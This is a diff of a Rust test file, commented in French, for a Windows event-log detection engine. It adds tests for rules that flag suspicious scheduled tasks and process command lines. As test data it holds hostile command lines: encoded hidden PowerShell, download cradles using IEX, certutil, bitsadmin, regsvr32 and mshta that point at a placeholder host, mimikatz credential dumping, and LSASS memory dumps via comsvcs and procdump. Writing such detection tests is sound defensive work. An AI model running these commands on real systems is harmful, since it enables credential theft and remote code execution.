@@ -9,7 +9,10 @@ use std::sync::atomic::{AtomicU64, Ordering};
 use chrono::{DateTime, Duration, Utc};
 use proptest::prelude::*;
 
-use super::jeu::{JOURNAUX, Lieu, REGLES, adresse_inhabituelle, lieu, script_suspect, service_suspect};
+use super::jeu::{
+    JOURNAUX, Lieu, REGLES, actions_de_tache, adresse_inhabituelle, lieu, ligne_suspecte, script_suspect,
+    service_suspect, tache_suspecte,
+};
 use super::moteur::{
     BornesMoteur, EtatJournal, Gravite, Jugement, Lecture, Manque, Moteur, Options, Reserve, Trouvaille,
 };
@@ -86,6 +89,15 @@ fn options() -> Options {
 fn ordinaire() -> Vec<EvenementWindows> {
     let mut v = vec![
         sec(4624, 0, &[("LogonType", "5"), ("TargetUserName", "SYSTEM")]),
+        // Un processus ordinaire, sa ligne de commande journalisée : l'audit de EVT-PRC-001 est allumé.
+        sec(
+            4688,
+            0,
+            &[
+                ("NewProcessName", "C:\\Windows\\System32\\notepad.exe"),
+                ("CommandLine", "notepad.exe C:\\Users\\alice\\notes.txt"),
+            ],
+        ),
         ev(
             "System",
             SCM,
@@ -170,7 +182,7 @@ fn chaque_regle_est_bien_formee() {
             );
         }
     }
-    assert_eq!(REGLES.len(), 11);
+    assert_eq!(REGLES.len(), 13);
 }
 
 // ---------------------------------------------------------------------------------------------------------------
@@ -1532,6 +1544,405 @@ fn champs_hostiles_sans_panique() {
 }
 
 // ---------------------------------------------------------------------------------------------------------------
+// EVT-TAC-001
+// ---------------------------------------------------------------------------------------------------------------
+
+const TACHES: &str = "Microsoft-Windows-TaskScheduler/Operational";
+
+/// Le XML d'une tâche, tel que le 4698 le porte : une action « Exec ».
+fn xml_tache(commande: &str, arguments: &str) -> String {
+    format!(
+        "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\"><RegistrationInfo><Author>SALON-PC\\alice</Author>\
+         </RegistrationInfo><Actions Context=\"Author\"><Exec><Command>{commande}</Command><Arguments>{arguments}</Arguments>\
+         </Exec></Actions></Task>"
+    )
+}
+
+/// Un 4698 (ou 4702) sur l'ordinateur « Salon-PC », par alice.
+fn tache(id: u32, nom: &str, commande: &str, arguments: &str) -> EvenementWindows {
+    let contenu = xml_tache(commande, arguments);
+    let champ = if id == 4702 { "TaskContentNew" } else { "TaskContent" };
+    let mut e = sec(
+        id,
+        0,
+        &[
+            ("SubjectUserName", "alice"),
+            ("SubjectDomainName", "SALON-PC"),
+            ("TaskName", nom),
+            (champ, &contenu),
+        ],
+    );
+    e.ordinateur = "Salon-PC".into();
+    e
+}
+
+#[test]
+fn taches_jugees_par_leur_action() {
+    let cas: &[(u32, &str, &str, Option<Gravite>)] = &[
+        (
+            4698,
+            "powershell.exe",
+            "-NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+            Some(Gravite::Alerte),
+        ),
+        (
+            4698,
+            "C:\\Users\\alice\\AppData\\Local\\Temp\\maj.exe",
+            "",
+            Some(Gravite::Alerte),
+        ),
+        (4698, "C:\\Users\\Public\\x.exe", "", Some(Gravite::Alerte)),
+        (4698, "cmd.exe", "/c start notepad", Some(Gravite::Alerte)),
+        (4698, "%COMSPEC%", "/c whoami", Some(Gravite::Alerte)),
+        (
+            4698,
+            "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
+            "/reporting",
+            Some(Gravite::Info),
+        ),
+        (4698, "C:\\ProgramData\\Outil\\outil.exe", "", Some(Gravite::Info)),
+        // Une tâche ordinaire créée : une information ; changée : rien.
+        (
+            4698,
+            "C:\\Program Files\\Sauvegarde\\copie.exe",
+            "--nuit",
+            Some(Gravite::Info),
+        ),
+        (4702, "C:\\Program Files\\Sauvegarde\\copie.exe", "--nuit", None),
+        // Les tâches de Windows que les mises à jour récrivent.
+        (
+            4702,
+            "%windir%\\system32\\rundll32.exe",
+            "/d acproxy.dll,PerformAutochkOperations",
+            None,
+        ),
+        (
+            4702,
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpCmdRun.exe",
+            "Scan -ScheduleJob",
+            None,
+        ),
+        // rundll32 qui va chercher ailleurs, ou un chemin qui sort du dossier de Defender.
+        (
+            4702,
+            "rundll32.exe",
+            "C:\\Users\\alice\\AppData\\Roaming\\x.dll,Lancer",
+            Some(Gravite::Alerte),
+        ),
+        (
+            4702,
+            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\..\\..\\..\\x.exe",
+            "",
+            Some(Gravite::Info),
+        ),
+        (
+            4702,
+            "C:\\Windows\\System32\\certutil.exe",
+            "-urlcache -f http://x.test/a a.exe",
+            Some(Gravite::Alerte),
+        ),
+    ];
+    for (id, commande, arguments, attendu) in cas {
+        let js = juger(&[tache(*id, "\\Essai", commande, arguments)]);
+        let g = gravites(&js, "EVT-TAC-001");
+        assert_eq!(
+            g,
+            attendu.iter().copied().collect::<Vec<_>>(),
+            "{id} {commande} {arguments}"
+        );
+        if attendu.is_some() {
+            let t = &trouvailles(&js, "EVT-TAC-001")[0];
+            assert_eq!(t.ordinateur, "Salon-PC");
+            assert!(t.details.iter().any(|(_, v)| v == "\\Essai"), "{:?}", t.details);
+            assert!(t.details.iter().any(|(_, v)| v == "SALON-PC\\alice"), "{:?}", t.details);
+        }
+    }
+}
+
+/// Le 4698 tel que Windows le rend : le XML de la tâche échappé dans celui de l'événement, ses guillemets deux fois.
+#[test]
+fn tache_lue_dans_le_xml_de_windows() {
+    let x = "<Event><System><Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4698</EventID><Level>0</Level>\
+             <TimeCreated SystemTime='2026-10-18T14:05:09Z'/><EventRecordID>4242</EventRecordID>\
+             <Channel>Security</Channel><Computer>Salon-PC</Computer></System><EventData>\
+             <Data Name='SubjectUserName'>alice</Data><Data Name='TaskName'>\\Mise a jour</Data>\
+             <Data Name='TaskContent'>&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;\
+             &lt;Command&gt;mshta.exe&lt;/Command&gt;&lt;Arguments&gt;&amp;quot;javascript:a=1&amp;quot;&lt;/Arguments&gt;\
+             &lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>";
+    let js = juger(&[du_xml(x)]);
+    let t = trouvailles(&js, "EVT-TAC-001");
+    assert_eq!(t.len(), 1);
+    assert_eq!(t[0].gravite, Gravite::Alerte);
+    assert!(
+        t[0].details.iter().any(|(_, v)| v == "mshta.exe \"javascript:a=1\""),
+        "{:?}",
+        t[0].details
+    );
+}
+
+#[test]
+fn actions_d_une_tache_hostile() {
+    // Plusieurs actions : chacune ; une balise sans fin, une action sans commande, des balises en majuscules.
+    let x = "<EXEC><COMMAND>a.exe</COMMAND></EXEC><Exec><Arguments>x</Arguments></Exec><Exec><Command>b.exe\
+             </Command><Arguments>-y</Arguments></Exec><Exec><Command>c.exe";
+    assert_eq!(
+        actions_de_tache(x),
+        vec![
+            ("a.exe".to_string(), String::new()),
+            ("b.exe".to_string(), "-y".to_string())
+        ]
+    );
+    // Une lettre dont la minuscule change de longueur ne décale pas la lecture.
+    let x = "<Exec><Command>İİİ\\cmd.exe</Command></Exec>";
+    assert_eq!(actions_de_tache(x)[0].0, "İİİ\\cmd.exe");
+    // Des milliers d'actions : au plus 32.
+    let x = "<Exec><Command>a.exe</Command></Exec>".repeat(5000);
+    assert_eq!(actions_de_tache(&x).len(), 32);
+}
+
+#[test]
+fn historique_du_planificateur() {
+    let inscrite = ev(
+        TACHES,
+        "Microsoft-Windows-TaskScheduler",
+        106,
+        0,
+        &[("TaskName", "\\Essai"), ("UserContext", "SALON-PC\\alice")],
+    );
+    let lancee = ev(
+        TACHES,
+        "Microsoft-Windows-TaskScheduler",
+        200,
+        5,
+        &[
+            ("TaskName", "\\Essai"),
+            (
+                "ActionName",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            ),
+        ],
+    );
+    let ordinaire = ev(
+        TACHES,
+        "Microsoft-Windows-TaskScheduler",
+        200,
+        6,
+        &[
+            ("TaskName", "\\Autre"),
+            ("ActionName", "C:\\Program Files\\App\\app.exe"),
+        ],
+    );
+    let js = juger(&[inscrite, lancee, ordinaire]);
+    assert_eq!(gravites(&js, "EVT-TAC-001"), [Gravite::Alerte, Gravite::Info]);
+}
+
+/// Deux sources de rechange : l'une lue et prouvée suffit ; aucune, non vérifiée, avec le réglage à allumer.
+#[test]
+fn taches_verifiees_par_l_une_ou_l_autre_source() {
+    let sans_historique: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != TACHES).collect();
+    // Ni audit prouvé, ni historique : non vérifiée, et le texte dit quoi allumer.
+    let j = regle(&juger_avec(&[], &sans_historique, options()), "EVT-TAC-001").clone();
+    assert!(!j.verifie());
+    assert!(j.manques.contains(&Manque::Absent(TACHES.into())), "{:?}", j.manques);
+    let (texte, _) = resultat::manque(
+        &Source::Vivant,
+        j.manques
+            .iter()
+            .find(|m| matches!(m, Manque::NonAudite { .. }))
+            .unwrap(),
+    );
+    assert!(
+        texte.contains("Auditer d'autres événements d'accès à l'objet"),
+        "{texte}"
+    );
+    assert!(texte.contains("historique"), "{texte}");
+    // L'audit prouvé (une tâche changée vue) : vérifiée sans l'historique.
+    let changee = tache(4702, "\\Essai", "C:\\Program Files\\App\\app.exe", "");
+    assert!(regle(&juger_avec(&[changee], &sans_historique, options()), "EVT-TAC-001").verifie());
+    // L'historique lu en entier : vérifiée sans l'audit.
+    assert!(regle(&juger(&[]), "EVT-TAC-001").verifie());
+    // L'historique désactivé (la valeur d'origine) et pas d'audit : non vérifiée.
+    let mut etats = tout_lu();
+    etats.iter_mut().find(|e| e.nom == TACHES).unwrap().active = Some(false);
+    let j = regle(&juger_avec(&[], &etats, options()), "EVT-TAC-001").clone();
+    assert!(j.manques.contains(&Manque::Desactive(TACHES.into())), "{:?}", j.manques);
+    assert!(j.manques.iter().any(|m| matches!(m, Manque::NonAudite { .. })));
+    // Une source lue en partie ne suffit pas.
+    let mut etats = sans_historique.clone();
+    etats.iter_mut().find(|e| e.nom == "Security").unwrap().lecture = Lecture::Lu(vec!["3 textes coupés".into()]);
+    let changee = tache(4702, "\\Essai", "C:\\Program Files\\App\\app.exe", "");
+    assert!(!regle(&juger_avec(&[changee], &etats, options()), "EVT-TAC-001").verifie());
+}
+
+// ---------------------------------------------------------------------------------------------------------------
+// EVT-PRC-001
+// ---------------------------------------------------------------------------------------------------------------
+
+fn processus(programme: &str, ligne: &str) -> EvenementWindows {
+    let mut e = sec(
+        4688,
+        0,
+        &[
+            ("SubjectUserName", "alice"),
+            ("SubjectDomainName", "SALON-PC"),
+            ("NewProcessName", programme),
+            ("CommandLine", ligne),
+            ("ParentProcessName", "C:\\Windows\\explorer.exe"),
+        ],
+    );
+    e.ordinateur = "Salon-PC".into();
+    e
+}
+
+#[test]
+fn processus_suspects() {
+    let ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+    let cas: &[(&str, &str, Option<Gravite>)] = &[
+        (
+            "C:\\Users\\alice\\Downloads\\mimikatz.exe",
+            "mimikatz.exe",
+            Some(Gravite::Critique),
+        ),
+        (
+            "C:\\Users\\alice\\x.exe",
+            "x.exe \"sekurlsa::logonpasswords\" exit",
+            Some(Gravite::Critique),
+        ),
+        (
+            "C:\\Windows\\System32\\rundll32.exe",
+            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full",
+            Some(Gravite::Critique),
+        ),
+        (
+            "C:\\Outils\\procdump64.exe",
+            "procdump64.exe -ma lsass.exe l.dmp",
+            Some(Gravite::Critique),
+        ),
+        (
+            ps,
+            "powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+            Some(Gravite::Alerte),
+        ),
+        (
+            ps,
+            "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
+            Some(Gravite::Alerte),
+        ),
+        (
+            ps,
+            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\"",
+            Some(Gravite::Alerte),
+        ),
+        (
+            "C:\\Windows\\System32\\certutil.exe",
+            "certutil -urlcache -split -f http://x.test/a.exe C:\\temp\\a.exe",
+            Some(Gravite::Alerte),
+        ),
+        (
+            "C:\\Windows\\System32\\certutil.exe",
+            "certutil -decode a.b64 a.exe",
+            Some(Gravite::Alerte),
+        ),
+        (
+            "C:\\Windows\\System32\\bitsadmin.exe",
+            "bitsadmin /transfer t http://x.test/a.exe C:\\temp\\a.exe",
+            Some(Gravite::Alerte),
+        ),
+        (
+            "C:\\Windows\\System32\\regsvr32.exe",
+            "regsvr32 /s /n /u /i:http://x.test/a.sct scrobj.dll",
+            Some(Gravite::Alerte),
+        ),
+        (
+            "C:\\Windows\\System32\\mshta.exe",
+            "mshta javascript:a=1",
+            Some(Gravite::Alerte),
+        ),
+        // Ordinaires.
+        (
+            ps,
+            "powershell.exe -ExecutionPolicy Bypass -File C:\\Program Files\\App\\maj.ps1",
+            None,
+        ),
+        (ps, "powershell -e court", None),
+        (
+            "C:\\Windows\\System32\\certutil.exe",
+            "certutil -hashfile a.iso SHA256",
+            None,
+        ),
+        (
+            "C:\\Windows\\System32\\rundll32.exe",
+            "rundll32.exe shell32.dll,Control_RunDLL",
+            None,
+        ),
+        (
+            "C:\\Windows\\System32\\notepad.exe",
+            "notepad.exe C:\\Users\\alice\\mimi.txt",
+            None,
+        ),
+    ];
+    for (programme, ligne, attendu) in cas {
+        let js = juger(&[processus(programme, ligne)]);
+        assert_eq!(
+            gravites(&js, "EVT-PRC-001"),
+            attendu.iter().copied().collect::<Vec<_>>(),
+            "{ligne}"
+        );
+        if attendu.is_some() {
+            let t = &trouvailles(&js, "EVT-PRC-001")[0];
+            assert!(t.details.iter().any(|(_, v)| v == "C:\\Windows\\explorer.exe"));
+        }
+    }
+}
+
+/// Sans la ligne de commande (la valeur d'origine) : le nom du programme se juge encore, mais la règle n'est pas
+/// vérifiée, et dit les deux réglages à allumer.
+#[test]
+fn processus_sans_ligne_de_commande() {
+    let mut evs = vec![processus("C:\\Users\\alice\\Downloads\\mimikatz.exe", "")];
+    let js = juger_nu(&evs, &tout_lu(), options());
+    let j = regle(&js, "EVT-PRC-001");
+    assert_eq!(gravites(&js, "EVT-PRC-001"), [Gravite::Critique]);
+    assert!(!j.verifie());
+    let (texte, _) = resultat::manque(&Source::Vivant, &j.manques[j.manques.len() - 1]);
+    assert!(
+        texte.contains("Auditer la création du processus") && texte.contains("Inclure la ligne de commande"),
+        "{texte}"
+    );
+    // Une ligne de commande d'un morceau abîmé ne prouve rien.
+    let mut abime = processus("C:\\Windows\\System32\\notepad.exe", "notepad.exe");
+    abime.verifie = false;
+    evs.push(abime);
+    assert!(
+        regle(&juger_nu(&evs, &tout_lu(), options()), "EVT-PRC-001")
+            .manques
+            .iter()
+            .any(|m| matches!(m, Manque::NonAudite { .. }))
+    );
+}
+
+proptest! {
+    /// Des lignes, des tâches et des chemins hostiles : jamais de panique, et des textes gardés bornés.
+    #[test]
+    fn lignes_et_taches_hostiles(
+        programme in ".{0,200}",
+        ligne in prop_oneof![".{0,600}", "(powershell|-e|-enc|certutil|-urlcache|http://|<Exec>|<Command>|</Command>|</Exec>|<Arguments>| |\\\\){0,80}"],
+    ) {
+        let _ = ligne_suspecte(&programme, &ligne);
+        let _ = tache_suspecte(&programme, &ligne);
+        let actions = actions_de_tache(&ligne);
+        prop_assert!(actions.len() <= 32);
+        let js = juger(&[processus(&programme, &ligne), tache(4698, &programme, &programme, &ligne)]);
+        for id in ["EVT-PRC-001", "EVT-TAC-001"] {
+            for t in trouvailles(&js, id) {
+                prop_assert!(t.objet.chars().count() <= super::moteur::TEXTE_MAX + 1);
+                prop_assert!(t.details.iter().all(|(_, v)| v.chars().count() <= super::moteur::TEXTE_MAX + 1));
+            }
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------------------------------------------
 // Constats et couverture
 // ---------------------------------------------------------------------------------------------------------------
 
@@ -1545,6 +1956,75 @@ fn analyse(js: Vec<Jugement>) -> Analyse {
     }
 }
 
+/// WIN-JRN-003 (le bilan) rend les trouvailles du moteur : chaque alerte avec sa règle `EVT-` devant et son niveau ;
+/// les règles vérifiées en un constat sain ; les non vérifiées regroupées par ce qui leur manque, avec sa raison
+/// typée (le journal de sécurité refusé sans droits d'administrateur), jamais comptées saines.
+#[test]
+fn constats_du_bilan() {
+    let jamais = |_: &str| false;
+    let vivant = |jugements: Vec<Jugement>| Analyse {
+        source: Source::Vivant,
+        jugements,
+        journaux: Vec::new(),
+        etats: Vec::new(),
+        manques_source: Vec::new(),
+    };
+    // Tout lu : une alerte, puis un seul constat sain qui nomme les treize règles.
+    let a = vivant(juger(&[processus(
+        "C:\\Users\\alice\\Downloads\\mimikatz.exe",
+        "mimikatz.exe",
+    )]));
+    let c = resultat::constats_du_bilan(&a, &jamais);
+    let messages: Vec<&str> = c.iter().map(|c| c.message.as_str()).collect();
+    assert_eq!(c.len(), 2, "{messages:#?}");
+    assert_eq!(c[0].probleme, Some(crate::risk::Niveau::Critique));
+    assert!(c[0].message.starts_with("EVT-PRC-001"), "{}", c[0].message);
+    assert!(c[1].verifie && c[1].probleme.is_none());
+    assert!(
+        c[1].message.contains("13") && c[1].message.contains("EVT-TAC-001"),
+        "{}",
+        c[1].message
+    );
+    // Sans droits d'administrateur : Security refusé ; ses règles non vérifiées, en un constat, raison « droits ».
+    let mut etats: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != "Security").collect();
+    etats.push(EtatJournal {
+        nom: "Security".into(),
+        lecture: Lecture::Refuse,
+        active: None,
+        principal: true,
+        suites: Vec::new(),
+    });
+    let c = resultat::constats_du_bilan(&vivant(juger_avec(&[], &etats, options())), &jamais);
+    let refuses: Vec<_> = c.iter().filter(|c| !c.verifie).collect();
+    assert!(!refuses.is_empty());
+    let droits = refuses
+        .iter()
+        .find(|c| c.precision == crate::modele::Precision::NonVerifie(crate::modele::Raison::Droits))
+        .unwrap();
+    for id in ["EVT-ADM-001", "EVT-MDP-001", "EVT-PRC-001", "EVT-AUD-001"] {
+        assert!(droits.message.contains(id), "{id} : {}", droits.message);
+    }
+    // Celles qui ne lisent pas Security restent vérifiées ; aucune règle de Security parmi les saines.
+    let sain = c.iter().find(|c| c.verifie && c.probleme.is_none()).unwrap();
+    assert!(
+        sain.message.contains("EVT-BIT-001") && !sain.message.contains("EVT-ADM-001"),
+        "{}",
+        sain.message
+    );
+    // Une alerte déclarée normale est tue ; une critique jamais.
+    let a = vivant(juger(&[sec(
+        4720,
+        0,
+        &[("TargetUserName", "bob"), ("SubjectUserName", "alice")],
+    )]));
+    let toujours = |_: &str| true;
+    assert!(
+        resultat::constats_du_bilan(&a, &toujours)
+            .iter()
+            .all(|c| c.probleme.is_none())
+    );
+}
+
 #[test]
 fn constats_et_couverture() {
     let jamais = |_: &str| false;
@@ -1552,7 +2032,7 @@ fn constats_et_couverture() {
     // Tout lu, rien trouvé : sain.
     let r = resultat::resultat(&analyse(juger(&[])), debut, &jamais);
     assert_eq!(r.verdict(), "sain", "{:#?}", r.couverture);
-    assert_eq!(r.couverture.verifies, 11);
+    assert_eq!(r.couverture.verifies, 13);
     // Sans Security : non vérifié, jamais sain, et chaque règle qui le lit le dit.
     let sans: Vec<EtatJournal> = tout_lu().into_iter().filter(|x| x.nom != "Security").collect();
     let r = resultat::resultat(&analyse(juger_avec(&[], &sans, options())), debut, &jamais);
@@ -1742,6 +2222,7 @@ fn preuve_d_audit() {
         }],
         limite: None,
         defender: false,
+        un_journal_suffit: false,
     }];
     let essai = |evs: &[EvenementWindows]| {
         let mut m = Moteur::nouveau(ESSAI, options(), BornesMoteur::default());
